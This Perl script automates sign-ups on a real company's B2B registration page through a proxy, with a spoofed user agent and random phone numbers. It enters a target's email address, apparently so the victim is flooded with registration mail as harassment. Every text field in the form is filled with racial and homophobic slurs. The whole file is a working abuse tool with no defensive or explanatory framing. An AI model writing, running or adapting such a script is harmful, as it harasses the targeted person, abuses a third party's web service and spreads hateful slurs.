#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Cookies;

my $target = shift;
my $proxy = shift;
my $user_agent = shift;
#my $user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:55.0) Gecko/20100101 Firefox/55.0';

my $ua = LWP::UserAgent->new;
my $cookie_jar = HTTP::Cookies->new;
        $ua->timeout(5);
        $ua->agent($user_agent);
        $ua->cookie_jar($cookie_jar);
        $ua->proxy(https => 'http://'.$proxy);

# https://b2b.viacom.com/register

my $get_signup_page = $ua->get('https://b2b.viacom.com/register');
        my $signup_page_string = $get_signup_page->as_string;
        # my () = ($signup_page_string =~ m//);

my $phone_number = '';

my $area_code = int(rand(2));

if ($area_code == 0) {
        $phone_number = '505'.(int(rand(899))+100).(int(rand(8999))+1000);
}

elsif ($area_code == 1) {
        $phone_number = '719'.(int(rand(899))+100).(int(rand(8999))+1000);
}


my $signup = $ua->post(
        'https://b2b.viacom.com/feeds/register',
        Referer => 'https://b2b.viacom.com/register',
        #Content_Type => '',
        #Content_Type => 'application/x-www-form-urlencoded',
        Content_Type => 'multipart/form-data',
        #Content_Type => 'application/json',
        #Accept => '',
        #Accept => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        Accept => '*/*',
        Content =>
        [
        'selfRegisteredUserData[Username]' => 'GayNiggerAssociationOfAmerica'.(int(rand(9000))+1000),
        'selfRegisteredUserData[Password]' => 'Niggers11',
        'selfRegisteredUserData[ConfirmPassword]' => 'Niggers11',
        'selfRegisteredUserData[CompanyName]' => 'Gay Nigger Association of America',
        'selfRegisteredUserData[Title]' => 'Gay Nigger',
        'selfRegisteredUserData[FirstName]' => 'Gay Nigger Association of America',
        'selfRegisteredUserData[LastName]' => 'Gay Nigger Association of America',
        'selfRegisteredUserData[Phone]' => $phone_number,
        'selfRegisteredUserData[Email]' => $target
        ]
        );

